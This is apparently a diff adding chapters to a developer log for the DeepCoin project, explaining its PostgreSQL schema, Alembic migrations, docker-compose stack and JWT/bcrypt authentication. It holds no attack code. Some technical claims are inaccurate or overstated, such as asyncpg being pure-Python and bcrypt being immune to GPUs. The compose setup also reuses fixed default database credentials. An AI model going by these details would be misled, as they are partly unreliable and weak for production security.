+    Enum(UserRole, name="user_role"), nullable=False, default=UserRole.analyst,
+    server_default=UserRole.analyst.value,
+)
+```
+
+`Enum(UserRole, name="user_role")` — creates a PostgreSQL native ENUM type called `user_role`.
+In the database, the column stores the string `"admin"`, `"curator"`, or `"analyst"` but
+PostgreSQL enforces that ONLY those values are allowed — not any other string.
+
+`default=UserRole.analyst` — when Python creates a new `User()` object WITHOUT specifying role,
+it defaults to `analyst`. This is the Python-side default.
+
+`server_default=UserRole.analyst.value` — when PostgreSQL inserts a row WITHOUT the role column
+specified (e.g. in a raw SQL INSERT), it defaults to `"analyst"`. This is the database-side
+default. Having both ensures the correct default regardless of how the insert happens.
+
+```python
+created_at: Mapped[datetime] = mapped_column(
+    DateTime(timezone=True), nullable=False, server_default=func.now()
+)
+```
+
+`DateTime(timezone=True)` — stores the timestamp WITH timezone information (TIMESTAMPTZ in
+PostgreSQL). This is critical: if you store `2026-03-01 14:00:00` without timezone, it is
+ambiguous — is that Paris time? Tunis time? UTC? With `TIMESTAMPTZ`, PostgreSQL stores everything
+in UTC internally and converts on display. You will never get "wrong time" bugs from timezone
+confusion.
+
+`server_default=func.now()` — PostgreSQL sets this to the current UTC timestamp at INSERT time.
+The Python code never needs to pass `created_at=datetime.now()` — it's automatic.
+
+```python
+updated_at: Mapped[datetime] = mapped_column(
+    DateTime(timezone=True), nullable=False,
+    server_default=func.now(), onupdate=func.now()
+)
+```
+
+`onupdate=func.now()` — every time this row is UPDATED, PostgreSQL automatically updates this
+timestamp. This is a SQLAlchemy instruction. It means `updated_at` always reflects the last
+modification time without any manual code.
+
+```python
+last_login_at: Mapped[datetime | None] = mapped_column(DateTime(timezone=True), nullable=True)
+email_verified_at: Mapped[datetime | None] = mapped_column(DateTime(timezone=True), nullable=True)
+```
+
+Both are nullable timestamps. When the user hasn't logged in yet, `last_login_at` is `NULL`.
+When the email is not yet verified, `email_verified_at` is `NULL`.
+
+**Why `email_verified_at` is a timestamp, not a boolean:**
+
+A boolean `is_email_verified = True/False` would be simpler. But a timestamp gives you MORE
+information for free: not just "is it verified?" but "when was it verified?". If a user contacts
+support saying "I never received my verification email", you can check if the timestamp exists
+and when it was set. The extra 8 bytes per row is negligible.
+
+**The Relationships:**
+
+```python
+classifications:   Mapped[list["Classification"]] = relationship(back_populates="user", lazy="select")
+```
+
+This declares that a `User` can have MANY `Classification` rows. In Python, `user.classifications`
+returns a list of all classifications for that user. `back_populates="user"` means the
+`Classification` model has a matching `user` attribute that points back. This is a bidirectional
+relationship — you can navigate from user to their classifications AND from a classification
+back to its user.
+
+`lazy="select"` — loading is NOT automatic. When you fetch a `User` object, SQLAlchemy does NOT
+immediately load all related `Classifications`. You must explicitly request them with a
+`selectinload()` call:
+```python
+result = await db.execute(
+    select(User).options(selectinload(User.classifications)).where(User.id == user_id)
+)
+```
+This is REQUIRED in async mode — automatic lazy loading would block the event loop.
+
+---
+
+#### 57.6.3  The `Classification` Table — Replaces the SQLite Store
+
+```python
+class Classification(Base):
+    __tablename__ = "classifications"
+
+    id: Mapped[str] = mapped_column(UUID(as_uuid=False), primary_key=True,
+                                     server_default=func.gen_random_uuid())
+    user_id: Mapped[str | None] = mapped_column(
+        UUID(as_uuid=False),
+        ForeignKey("users.id", ondelete="SET NULL"),
+        nullable=True, index=True,
+    )
+```
+
+`ForeignKey("users.id", ondelete="SET NULL")` — this is a **foreign key** constraint. It says:
+"the value in this `user_id` column MUST either be `NULL` OR match an existing `id` in the
+`users` table". PostgreSQL enforces this — you cannot insert a `Classification` with a
+`user_id` that doesn't exist in `users`.
+
+`ondelete="SET NULL"` — this is the critical decision. What should happen if the User is
+deleted?
+
+Option A — `CASCADE`: delete the user → delete ALL their classifications too. BAD for a
+museum! A researcher's years of work would disappear when their account is removed.
+
+Option B — `SET NULL`: delete the user → set `user_id = NULL` on all their records. The
+classifications survive, now "owned by nobody". An administrator can still see them. This
+is the correct choice.
+
+`nullable=True` — user_id CAN be NULL. This means guests (users who haven't registered) can
+still submit analysis requests. Their records get `user_id = NULL`. This decision allows us
+to say "try it out, no registration required" — a much better user acquisition strategy.
+
+```python
+payload: Mapped[dict] = mapped_column(JSONB, nullable=False)
+```
+
+`JSONB` is PostgreSQL's binary JSON type (the B is for Binary). It stores the complete
+`ClassifyResponse` dictionary — the CNN prediction, agent results, top-5, confidence, route
+taken — everything. This is a deliberate choice to be flexible:
+
+- The `ClassifyResponse` schema evolves as we add new agent results, new fields.
+- If we stored each field in a separate column, every schema change would require a database
+  migration that potentially breaks old rows.
+- With JSONB, old records keep their old structure and new records include new fields.
+
+The indexed scalar columns (`label`, `confidence`, `route_taken`) are extracted so we can
+efficiently query "all high-confidence historian results" without parsing JSONB for every row.
+
+```python
+__table_args__ = (
+    Index("ix_classifications_user_ts", "user_id", "timestamp"),
+)
+```
+
+A **composite index** on `(user_id, timestamp)`. The most common query pattern is: "get all
+classifications for user X, newest first". A composite index on both columns handles this in
+O(log n) instead of O(n). Without it, PostgreSQL would scan the entire table and then sort.
+
+---
+
+#### 57.6.4  The `Feedback` Table — Corrections Deserve Their Own Table
+
+```python
+class Feedback(Base):
+    __tablename__ = "feedback"
+
+    classification_id: Mapped[str] = mapped_column(
+        UUID(as_uuid=False),
+        ForeignKey("classifications.id", ondelete="CASCADE"),
+        nullable=False, index=True,
+    )
+```
+
+`ondelete="CASCADE"` — if the parent `Classification` is deleted, all its `Feedback` rows are
+automatically deleted too. Unlike classifications (which outlive their user), feedback without
+a parent classification is meaningless. Cascade is the right call here.
+
+**Why a separate table instead of storing feedback in the JSONB payload?**
+
+The old system stored feedback as a sub-object inside the classification's JSON payload:
+```json
+{"feedback": {"correct_type_id": "1017", "note": "...", "created_at": "2026-03-01..."}}
+```
+
+A proper table gives us:
+- SQL queries over feedback: "which coin type is most often incorrectly classified?"
+- Per-feedback timestamps: when exactly did the correction happen?
+- Per-feedback user_id: which users are providing the most corrections?
+- Active learning exports: `SELECT * FROM feedback WHERE created_at > '2026-01-01'`
+  to build a retraining dataset
+
+---
+
+#### 57.6.5  The `AuditLog` Table — Non-Repudiation
+
+```python
+class AuditLog(Base):
+    __tablename__ = "audit_log"
+
+    action: Mapped[str] = mapped_column(String(100), nullable=False, index=True)
+    resource_type: Mapped[str | None] = mapped_column(String(50), nullable=True)
+    resource_id: Mapped[str | None] = mapped_column(String(255), nullable=True)
+    payload: Mapped[dict | None] = mapped_column(JSONB, nullable=True)
+    ip_address: Mapped[str | None] = mapped_column(String(45), nullable=True)
+```
+
+**What is an audit log?**
+
+An audit log is a chronological record of significant events in your system. Every important
+action — login, logout, password change, data deletion — gets written as an immutable row.
+
+"Immutable" means: once written, NEVER updated or deleted. The table has no UPDATE route and
+no foreign key CASCADE DELETEs. If someone deleted a fraudulent record, you would lose the
+evidence. The audit log is the legal record.
+
+**Non-repudiation** is the security property that says: "you cannot deny that you did this
+action, because we have a record with your user ID, the timestamp, and your IP address."
+
+**The `action` naming convention — `"{resource}.{verb}"`:**
+
+```
+"user.register"       new account created
+"user.login"          successful authentication
+"user.login_failed"   wrong password attempt (logged even though it failed!)
+"user.role_change"    admin escalated or downgraded someone
+"user.suspend"        admin suspended an account
+"classify"            coin analysis run
+"record.delete"       history record removed
+"feedback.submit"     mark-as-wrong activated
+```
+
+**Why log `user.login_failed`?**
+
+5 failed login attempts in 60 seconds from the same IP = a brute-force attack. The audit log
+is the data source for a future anomaly detection rule. If the auth log only records successes,
+you are blind to attacks.
+
+`ip_address: Mapped[str | None] = mapped_column(String(45), nullable=True)` — IPv6 addresses
+are up to 39 characters. IPv4 are up to 15. We store 45 to be safe, handling both.
+
+---
+
+#### 57.6.6  The `EmailVerification` Table — One-Time Links
+
+```python
+class EmailVerification(Base):
+    __tablename__ = "email_verifications"
+
+    token: Mapped[str] = mapped_column(String(255), unique=True, nullable=False, index=True)
+    expires_at: Mapped[datetime] = mapped_column(DateTime(timezone=True), nullable=False)
+    used_at: Mapped[datetime | None] = mapped_column(DateTime(timezone=True), nullable=True)
+```
+
+When a user registers, we generate a random token like `xK9mQ2pR8vN1w...` and email them a
+link: `https://deepcoin.app/verify-email?token=xK9mQ2pR8vN1w...`.
+
+When they click the link, our backend looks up the token in this table, checks it's not expired
+and not used, then activates their account.
+
+**Why `used_at` instead of deleting the row on use?**
+
+If we DELETE the row after use, we lose the history. Consider this attack scenario:
+
+1. Attacker intercepts the verification email somehow.
+2. Legitimate user clicks the link at 14:00 — account activated, token deleted.
+3. Attacker tries to click the same link at 14:05.
+4. WITHOUT `used_at`: the row is gone → 404 "Invalid link" → ambiguous. Was it a server error?
+5. WITH `used_at`: the row exists with `used_at=14:00` → we return "This link was already used"
+   AND we can see that someone else used it at 14:00. Forensic evidence.
+
+A scheduled cleanup job can delete rows older than 48 hours.
+
+**The `reset:` prefix for password reset tokens:**
+
+We reuse the `email_verifications` table for BOTH email verification AND password reset tokens.
+To distinguish them:
+
+```python
+# Email verification token:
+token = "xK9mQ2pR8vN1w..."
+
+# Password reset token:
+token = "reset:xK9mQ2pR8vN1w..."
+```
+
+The `reset:` prefix is stored in the `token` column. When we look up a password reset, we
+search for `token = "reset:" + body.token`. This prevents a verification token from being
+accidentally used as a password reset token.
+
+---
+
+#### 57.6.7  The `RefreshToken` Table — Secure Session Persistence
+
+```python
+class RefreshToken(Base):
+    __tablename__ = "refresh_tokens"
+
+    token_hash: Mapped[str] = mapped_column(String(64), unique=True, nullable=False, index=True)
+    expires_at: Mapped[datetime] = mapped_column(DateTime(timezone=True), nullable=False)
+    revoked_at: Mapped[datetime | None] = mapped_column(DateTime(timezone=True), nullable=True)
+    ip_address: Mapped[str | None] = mapped_column(String(45), nullable=True)
+```
+
+A refresh token is a long-lived secret that lets users stay logged in across browser sessions
+without re-entering their password. Section 58 explains the full theory. Here is the database
+design:
+
+`token_hash: String(64)` — SHA-256 produces a 64-character hex string. We store the HASH
+of the token, not the token itself. Why: if an attacker reads the database dump and sees
+`token_hash = "a3f8b2..."`, they cannot reverse that to the original token. The
+original token (which is in the user's browser cookie) is the secret; the hash in the database
+is not directly usable.
+
+`revoked_at` — analogous to `used_at` in `EmailVerification`. We soft-delete by recording when
+the token was revoked. The original row stays forever (well, until a cleanup job runs). This
+supports reuse detection: if we see a token that has `revoked_at` set, someone is trying to use
+a revoked token — a possible theft scenario.
+
+---
+
+### 57.7  What Alembic Is — "Git for Your Database Schema"
+
+**The problem without Alembic:**
+
+Suppose you are running DeepCoin in production. The `users` table exists with 10,000 users.
+Tomorrow you need to add a `bio` column. How do you change the production database?
+
+Without a migration tool: you run `ALTER TABLE users ADD COLUMN bio TEXT;` directly on the
+production database. Problems:
+- This change is not tracked anywhere. In 6 months, why does this column exist?
+- Another developer sets up a new development machine. Their database doesn't have `bio`. They
+  get runtime errors.
+- You cannot roll back. If `bio` causes problems, you must manually `ALTER TABLE ... DROP COLUMN`.
+
+With Alembic:
+- Every change is a numbered migration file like `002_add_user_bio.py`.
+- The file has an `upgrade()` function (forward change) and a `downgrade()` function (rollback).
+- You run `alembic upgrade head` to apply all pending migrations in order.
+- You run `alembic downgrade -1` to undo the last migration.
+- The current migration version is stored in the `alembic_version` table in the database.
+- New developer → `alembic upgrade head` → their database is identical to production.
+
+**Alembic is the "git for your database schema". Migrations are commits.**
+
+---
+
+### 57.8  File: `alembic.ini` — The Configuration File
+
+```ini
+[alembic]
+script_location = alembic
+sqlalchemy.url = postgresql+asyncpg://deepcoin:deepcoin@localhost:5432/deepcoin
+prepend_sys_path = .
+timezone = UTC
+```
+
+`script_location = alembic` — look for migration files in the `alembic/` directory at the
+project root.
+
+`sqlalchemy.url` — the database to run migrations against. This is overridden by the
+`DATABASE_URL` environment variable in `env.py` when running in Docker.
+
+`timezone = UTC` — all timestamps in migration files use UTC.
+
+`[loggers]`, `[handlers]`, `[formatters]` — standard Python logging configuration for
+Alembic's output messages. The `root` logger level `WARNING` suppresses noisy debug output;
+`alembic` itself logs at `INFO` so you see which migration is being applied.
+
+---
+
+### 57.9  File: `alembic/env.py` — The Migration Runner
+
+`env.py` is the script that Alembic executes when you run `alembic upgrade head`. It is responsible
+for connecting to the database and running `upgrade()` and `downgrade()` functions from migration
+files.
+
+The critical pattern for async databases:
+
+```python
+from sqlalchemy.pool import NullPool
+
+def run_migrations_offline() -> None:
+    """Run migrations against a pre-configured URL, no live DB connection."""
+    context.configure(url=get_url(), ...)
+    with context.begin_transaction():
+        context.run_migrations()
+
+def do_run_migrations(connection: Connection) -> None:
+    context.configure(connection=connection, target_metadata=target_metadata)
+    with context.begin_transaction():
+        context.run_migrations()
+
+async def run_async_migrations() -> None:
+    """Create an async engine with NullPool, connect, and run migrations."""
+    connectable = create_async_engine(get_url(), poolclass=NullPool)
+    async with connectable.connect() as connection:
+        await connection.run_sync(do_run_migrations)
+    await connectable.dispose()
+
+def run_migrations_online() -> None:
+    asyncio.run(run_async_migrations())
+```
+
+**Why `NullPool` specifically for migrations?**
+
+`NullPool` means "no connection pool — open a fresh connection for each use and close it
+immediately". For the API server, pooling is critical (reuse connections across requests).
+But for a one-shot migration script, we want exactly ONE connection, no pool overhead, and
+guaranteed cleanup when the script exits. `NullPool` is the standard Alembic recommendation
+for async engines.
+
+**Why `connection.run_sync(do_run_migrations)`?**
+
+Alembic's migration system was written for synchronous code. `run_sync()` takes a synchronous
+callable and runs it inside an async connection's thread executor, bridging the sync migration
+API into our async engine.
+
+---
+
+### 57.10  File: `alembic/versions/001_initial_schema.py` — The First Migration
+
+This file defines the entire initial database schema as explicit SQL DDL (Data Definition Language).
+
+**Why explicit DDL instead of Alembic autogenerate?**
+
+Alembic has an `--autogenerate` option that compares your Python models against the current
+database and generates migration code automatically. We did NOT use it. Why:
+
+1. **Autogenerate misses PostgreSQL-specific features.** It cannot generate `gen_random_uuid()`,
+   ENUM type creation, GIN indexes, INET types, or JSONB. We would have to manually edit every
+   autogenerated file anyway.
+
+2. **Explicit is better than implicit.** When a new developer reads `001_initial_schema.py`,
+   they see EXACTLY what the database looks like. No guessing, no "run autogenerate and see
+   what it produces".
+
+3. **Autogenerate can produce wrong output** if the environment isn't set up perfectly.
+   An explicit file always does exactly what you wrote.
+
+**The table creation ORDER matters — foreign key dependencies:**
+
+```python
+def upgrade() -> None:
+    # Must create in FK dependency order:
+    # 1. users (no FKs)
+    # 2. classifications (FK → users)
+    # 3. feedback (FK → classifications, FK → users)
+    # 4. audit_log (FK → users)
+    # 5. email_verifications (FK → users)
+    # 6. refresh_tokens (FK → users)
+```
+
+You cannot create `classifications` before `users` exists, because the FK constraint
+`REFERENCES users(id)` would reference a table that doesn't exist yet. PostgreSQL would
+reject the `CREATE TABLE`.
+
+**The downgrade function reverses in the opposite order:**
+
+```python
+def downgrade() -> None:
+    # Must DROP in reverse FK dependency order:
+    op.drop_table("refresh_tokens")
+    op.drop_table("email_verifications")
+    op.drop_table("audit_log")
+    op.drop_table("feedback")
+    op.drop_table("classifications")
+    op.drop_table("users")
+    op.execute("DROP TYPE IF EXISTS user_status")
+    op.execute("DROP TYPE IF EXISTS user_role")
+```
+
+You cannot drop `users` while `classifications` still has a foreign key pointing to it.
+PostgreSQL would refuse with "ERROR: cannot drop table users because other objects depend on it".
+
+---
+
+### 57.11  File: `docker-compose.yml` — The Full Stack
+
+**What is Docker?**
+
+Docker is a tool that packages a program plus ALL its dependencies into a single unit called
+a **container**. Think of a container like a shipping container — the same container that
+works on a ship works on a truck works on a train. Analogously, a Docker container that runs
+on your laptop runs identically on a cloud server.
+
+Without Docker: installing PostgreSQL on Windows is different from Linux. Different versions,
+different paths, different startup commands. "It works on my machine" is the joke.
+
+With Docker: `docker compose up postgres` downloads a Linux-based PostgreSQL 17 container
+and starts it. The same command works on Windows, Mac, and Linux. No installation. No version
+conflicts.
+
+**Services in `docker-compose.yml`:**
+
+```yaml
+services:
+
+  postgres:
+    image: postgres:17-alpine
+    environment:
+      POSTGRES_USER: deepcoin
+      POSTGRES_PASSWORD: deepcoin
+      POSTGRES_DB: deepcoin
+    ports:
+      - "5432:5432"
+    volumes:
+      - postgres_data:/var/lib/postgresql/data
+    healthcheck:
+      test: ["CMD-SHELL", "pg_isready -U deepcoin"]
+      interval: 5s
+      timeout: 5s
+      retries: 5
+```
+
+`image: postgres:17-alpine` — use PostgreSQL version 17, built on Alpine Linux (a tiny 5MB
+Linux distribution). Alpine images are much smaller than the default Debian-based ones.
+
+`environment:` — these environment variables are passed INTO the container. PostgreSQL reads
+them on first start to create the initial user, password, and database.
+
+`ports: "5432:5432"` — map host port 5432 to container port 5432. Format is `HOST:CONTAINER`.
+This lets your laptop's Python code connect to `localhost:5432` even though PostgreSQL is
+running inside the container.
+
+`volumes: postgres_data:/var/lib/postgresql/data` — databases must persist across container
+restarts. `/var/lib/postgresql/data` is where PostgreSQL stores its files inside the container.
+By mounting a named volume there, the data survives `docker compose down` + `docker compose up`.
+
+`healthcheck:` — before other services start, Docker will poll this health check. `pg_isready`
+is a PostgreSQL tool that returns success when the database is accepting connections. Other
+services that `depends_on: postgres: condition: service_healthy` will wait until PostgreSQL
+is ready before starting.
+
+```yaml
+  migrator:
+    profiles: ["migrate"]
+    image: python:3.11-slim
+    working_dir: /app
+    command: sh -c "pip install -q alembic asyncpg sqlalchemy && alembic upgrade head"
+    volumes:
+      - .:/app
+    environment:
+      - DATABASE_URL=postgresql+asyncpg://deepcoin:deepcoin@postgres:5432/deepcoin
+    depends_on:
+      postgres:
+        condition: service_healthy
+```
+
+The `migrator` is a special one-shot service. `profiles: ["migrate"]` means it only runs when
+you explicitly include it: `docker compose --profile migrate up migrator`. It runs
+`alembic upgrade head` — applies all pending migrations — and then exits. It is NOT meant to
+run continuously alongside the API.
+
+**How to run migrations with Docker:**
+
+```powershell
+# Step 1: Start PostgreSQL only
+docker compose up postgres -d
+
+# Step 2: Run migrations (one-shot container)
+docker compose --profile migrate run migrator
+
+# Step 3: Start the full stack
+docker compose up -d
+```
+
+**The `api` and `web` services:**
+
+```yaml
+  api:
+    build: .
+    ports: ["8000:8000"]
+    environment:
+      DATABASE_URL: postgresql+asyncpg://deepcoin:deepcoin@postgres:5432/deepcoin
+      ENV: production
+    depends_on:
+      postgres:
+        condition: service_healthy
+
+  web:
+    build: ./frontend
+    ports: ["3000:3000"]
+    environment:
+      NEXT_PUBLIC_API_URL: http://nginx/api
+    depends_on: [api]
+```
+
+Notice: inside Docker Compose, services communicate by their SERVICE NAME, not `localhost`.
+The API connecting to PostgreSQL uses `host=postgres` (the service name), not `localhost`.
+`depends_on: condition: service_healthy` ensures the API only starts once PostgreSQL has passed
+its health check.
+
+---
+
+### 57.12  Requirements.txt Updates
+
+Four packages were added to support Phase A1:
+
+```
+asyncpg==0.30.0       # async PostgreSQL driver — the adapter between asyncpg and SQLAlchemy
+passlib[bcrypt]==1.7.4 # password hashing library with bcrypt support
+email-validator==2.2.0 # validates email format (used by Pydantic EmailStr type)
+resend==2.4.0          # SDK for Resend email delivery service
+```
+
+`asyncpg` — the pure-Python asynchronous PostgreSQL driver. SQLAlchemy's `create_async_engine`
+uses it internally. It speaks the PostgreSQL wire protocol directly for maximum performance.
+
+`passlib[bcrypt]` — `passlib` is a Python password hashing library. The `[bcrypt]` extra
+installs the `bcrypt` C extension. Without this extra, bcrypt would not be available as a
+scheme.
+
+`email-validator` — Pydantic's `EmailStr` type requires this package to validate that
+`"dhia@esprit.tn"` is a valid email format. Without it, `EmailStr` falls through to plain `str`
+validation.
+
+`resend` — the Python SDK for the Resend email API. Resend is a transactional email service
+(like SendGrid, but developer-friendly). We use it to send verification emails and password
+reset emails. If `RESEND_API_KEY` is not set, the code logs the email content to the terminal
+instead of actually sending it (dev-mode fallback).
+
+---
+
+### 57.13  How All Phase A1 Files Connect
+
+```
+alembic.ini
+    └── tells Alembic where to find migration scripts + DB URL
+
+alembic/env.py
+    └── reads DB URL from environment
+    └── imports Base.metadata from src/api/db/base.py
+    └── connects to DB and runs migration files
+
+alembic/versions/001_initial_schema.py
+    └── defines the initial CREATE TABLE statements
+    └── depends on nothing (runs first)
+
+src/api/db/base.py
+    └── defines Base (DeclarativeBase with naming conventions)
+    └── imported by models.py
+
+src/api/db/models.py
+    └── imports Base from base.py
+    └── defines 6 ORM models (User, Classification, Feedback, AuditLog, EmailVerification, RefreshToken)
+    └── each model describes one database table
+
+src/api/db/session.py
+    └── imports DATABASE_URL from environment
+    └── creates create_async_engine (using asyncpg)
+    └── creates AsyncSessionLocal (session factory)
+    └── exposes get_db() async generator (FastAPI dependency)
+
+docker-compose.yml
+    └── starts PostgreSQL (postgres service)
+    └── runs migrations (migrator service, profile=migrate)
+    └── starts API (api service, depends on postgres)
+    └── starts frontend (web service)
+    └── all connected via internal Docker network
+```
+
+---
+
+### 57.14  Commit Summary
+
+| Commit | Description |
+|--------|-------------|
+| `40933f2` | Phase A1+A2 — PostgreSQL ORM, Alembic migrations, full JWT auth system |
+
+Files added in Phase A1:
+- `src/api/db/__init__.py` — package marker
+- `src/api/db/base.py` — DeclarativeBase with naming conventions
+- `src/api/db/session.py` — async engine, session factory, get_db dependency
+- `src/api/db/models.py` — 6 ORM table models (380 lines)
+- `alembic.ini` — Alembic configuration
+- `alembic/env.py` — async migration runner
+- `alembic/script.py.mako` — migration file template
+- `alembic/versions/001_initial_schema.py` — full initial DDL
+- `docker-compose.yml` — full stack (postgres, redis, api, web, nginx, migrator)
+- `requirements.txt` updated — asyncpg, passlib[bcrypt], email-validator, resend
+
+---
+
+---
+
+## Section 58 — Phase A2: JWT Authentication System (Register, Login, Tokens, RBAC)
+**Date:** March 2026 | **Commit:** `40933f2`
+
+---
+
+### 58.1  Why Authentication Matters — The Museum Analogy
+
+Imagine DeepCoin without any authentication. Anyone on the internet could:
+
+1. Submit unlimited coin analysis requests, burning our Gemini/Ollama quota.
+2. Delete other people's research history.
+3. Get the admin dashboard and export the entire database.
+4. Impersonate a museum curator and publish fake analysis reports.
+
+Authentication answers the question: **"Who are you?"**
+Authorization answers the question: **"What are you allowed to do?"**
+
+They are different:
+- Authentication: "Prove you are Dhia Chaieb." → you provide email + password → we verify.
+- Authorization: "Dhia has role=analyst, so they CANNOT access the admin panel."
+
+Without authentication, there is no "who", so there can be no authorization. Authentication
+comes first.
+
+---
+
+### 58.2  Why We NEVER Store Plain-Text Passwords
+
+Suppose we stored passwords like this in the database:
+
+```
+email                  | password
+dhia@esprit.tn         | MySecretPass123
+ahmed@museum.tn        | CorrectHorseBattery
+```
+
+Problems:
+
+1. **Database breach**: If an attacker dumps the database, they instantly have every user's
+   password in plain text. Most people reuse passwords. They get into the user's email, bank, etc.
+
+2. **Database admin abuse**: Any employee with database read access can see all passwords.
+
+3. **Log leaks**: If the password accidentally gets into a log file, it is exposed.
+
+The solution: **never store the password. Store a one-way transformation of it.**
+
+---
+
+### 58.3  What Password Hashing Is — "A One-Way Street"
+
+A hash function takes any input and produces a fixed-size output. The key property: you cannot
+reverse it. Given the output, you cannot compute the input.
+
+```
+"MySecretPass123"  →  hash function  →  "a3b8f2c9..."
+```
+
+When a user logs in:
+1. They send their password in the request: `"MySecretPass123"`.
+2. We hash it: `hash("MySecretPass123")` → `"a3b8f2c9..."`.
+3. We compare the hash to what's stored in the database.
+4. If they match: login succeeds. We never needed to "un-hash" anything.
+
+**Why not MD5 or SHA-256?**
+
+MD5 and SHA-256 are fast hash functions — they can compute millions of hashes per second on
+modern hardware. This is GOOD for file checksums and bad for passwords.
+
+An attacker who steals a database of SHA-256 hashed passwords can run a "brute-force" attack:
+compute `sha256("password")`, `sha256("password1")`, `sha256("Password123")`, etc. — billions
+of guesses per second on a GPU. Most passwords fall within minutes.
+
+**Why bcrypt is different:**
+
+bcrypt is intentionally slow. It has a "work factor" (also called "rounds" or "cost"). We use
+`work factor = 12`. This means computing one bcrypt hash takes approximately 250 milliseconds
+on modern hardware.
+
+For a user logging in: 250ms is barely noticeable. But for an attacker:
+- At 250ms per hash, they can try 4 hashes/second per CPU.
+- A GPU is no help — bcrypt is CPU-hard by design (it was designed to not parallelise well).
+- Cracking a 12-character bcrypt hash = centuries, not minutes.
+
+**The work factor is adjustable.** If hardware gets faster, we increase the work factor from
+12 to 13 (doubling the time) without changing anything else. Old hashes stored with work
+factor 12 still work — passlib's `deprecated="auto"` upgrades them on next login.
+
+---
+
+### 58.4  File: `src/api/auth/utils.py` — The Cryptographic Toolkit
+
+#### `hash_password()` and `verify_password()`
+
+```python
+_pwd_context = CryptContext(
+    schemes=["bcrypt"],
+    deprecated="auto",
+    bcrypt__rounds=12,
+)
+
+def hash_password(plain_password: str) -> str:
+    return _pwd_context.hash(plain_password)
+
+def verify_password(plain_password: str, hashed_password: str) -> bool:
+    return _pwd_context.verify(plain_password, hashed_password)
+```
+
+`CryptContext` is passlib's main entry point. It manages one or more hashing schemes.
+
+`schemes=["bcrypt"]` — we only use bcrypt. If we later want to migrate to Argon2 (the 2015
+Password Hashing Competition winner), we would add it here and set bcrypt to `deprecated`.
+
+`deprecated="auto"` — automatically detect old hashes (lower work factor) and mark them for
+rehash on next login.
+
+`bcrypt__rounds=12` — the work factor. Double-underscore means "set the `rounds` parameter of
+the `bcrypt` scheme". This takes ~250ms to compute on a modern CPU.
+
+`hash_password()` returns a string like:
+`$2b$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8BSjNkEKWfp5TdRW6py`
+
+Breaking down: `$2b$` = bcrypt version, `12$` = work factor, next 22 chars = the random salt,
+remaining 31 chars = the actual hash. The salt is embedded in the output string — no separate
+salt column needed.
+
+`verify_password()` uses **constant-time comparison** internally. Why constant-time? A timing
+attack: if the comparison short-circuits on the first mismatching character, then comparing
+`a` vs `z` takes 1ns (mismatch at position 0) but `aaaaaaaaaz` vs `aaaaaaaaab` takes longer
+(mismatch at position 9). An attacker could use timing to learn hash bytes. Constant-time
+comparison always takes the same time regardless of where the mismatch is.
+
+---
+
+#### `create_access_token()` — What is a JWT?
+
+**The problem JWTs solve:**
+
+Traditional session management stores a session ID server-side in a database:
+```
+Browser          Server                Database
+  |──[login]──→    |──[create session]──→ sessions table: {session_id="abc123", user_id=42}
+  |←─[Set-Cookie: session=abc123]────────|
+  |──[GET /me]──→  |──[lookup "abc123"]──→ returns user_id=42
+```
+
+Every request requires a database lookup. With 10,000 users logged in simultaneously, that is
+10,000 DB queries per second just for session validation.
+
+JWT (JSON Web Token) solves this by putting all the needed information INTO the token itself,
+signed with a server secret, so the server can verify it WITHOUT touching the database:
+
+```
+Browser                 Server
+  |──[login]──────────→  |  (verifies password, creates JWT)
+  |←─[access_token: ...]  |  (no session stored anywhere)
+  |──[GET /me + token]──→  |  (verifies JWT signature — no DB query)
+  |←─[user data]──────────  |  (reads user info FROM the token)
+```
+
+**The three parts of a JWT:**
+
+A JWT looks like: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM...eyJ...`
+
+It is three Base64-encoded parts separated by dots: `HEADER.PAYLOAD.SIGNATURE`
+
+**Part 1 — Header** (Base64 of JSON):
+```json
+{"alg": "HS256", "typ": "JWT"}
+```
+`alg: HS256` — HMAC-SHA256. The signature algorithm.
+
+**Part 2 — Payload** (Base64 of JSON):
+```json
+{
+  "sub": "550e8400-e29b-41d4-a716-446655440000",
+  "email": "dhia@esprit.tn",
+  "role": "analyst",
+  "status": "active",
+  "type": "access",
+  "iat": 1709388000,
+  "exp": 1709388900
+}
+```
+`sub` = subject (the user's ID). `iat` = issued at (Unix timestamp). `exp` = expiry.
+THIS DATA IS NOT ENCRYPTED. Anyone who has the token can Base64-decode the payload and
+read it. Do not put secrets in the payload.
+
+**Part 3 — Signature**:
+```
+HMAC-SHA256(Base64(header) + "." + Base64(payload), JWT_SECRET)
+```
+The server computes the HMAC of the header and payload using its private `JWT_SECRET`. The
+signature is appended as the third part. If ANYONE changes a single character in the payload
+(e.g. changes `"role": "analyst"` to `"role": "admin"`), the signature will not match the
+modified content.
+
+When the server receives a token:
+1. Split into three parts.
+2. Recompute the HMAC of (header + "." + payload) using `JWT_SECRET`.
+3. Compare to the third part.
+4. If match: the token is authentic. Read the payload claims.
+5. If mismatch: the token was tampered with. Reject it.
+6. Check `exp` > current time. If expired: reject.
+
+No database query needed for validation.
+
+**Our `create_access_token()` function:**
+
+```python
+_JWT_SECRET: str = os.getenv("JWT_SECRET", "CHANGE_ME_DO_NOT_USE_IN_PRODUCTION")
+_ACCESS_TOKEN_EXPIRE_MINUTES: int = int(os.getenv("ACCESS_TOKEN_EXPIRE_MINUTES", "15"))
+
+def create_access_token(data: dict, expires_delta: timedelta | None = None) -> str:
+    to_encode = data.copy()
+    expire = datetime.now(timezone.utc) + (expires_delta or timedelta(minutes=_ACCESS_TOKEN_EXPIRE_MINUTES))
+    to_encode.update({"exp": expire, "iat": datetime.now(timezone.utc), "type": "access"})
+    return jwt.encode(to_encode, _JWT_SECRET, algorithm="HS256")
+```
+
+`data.copy()` — never mutate the input dict. We copy it, then add `exp`, `iat`, and `type`.
+
+`type: "access"` claim — this allows us to distinguish access tokens from other token types.
+Our `decode_token()` checks `payload["type"] == "access"` and rejects anything else. This
+prevents a refresh token from being used AS an access token (different security level).
+
+**The `JWT_SECRET` startup guard:**
+
+```python
+if _ENV == "production" and _JWT_SECRET == "CHANGE_ME_DO_NOT_USE_IN_PRODUCTION":
+    raise RuntimeError("JWT_SECRET must be set in production....")
+```
+
+If someone deploys to production without setting `JWT_SECRET`, the API crashes on startup with
+a clear error message. Far better than silently using a known default that an attacker can use
+to forge any token they want.
+
+---
+
+#### `create_refresh_token()` — Long-Lived Session Key
+
+```python
+def create_refresh_token(expires_delta: timedelta | None = None) -> tuple[str, str, datetime]:
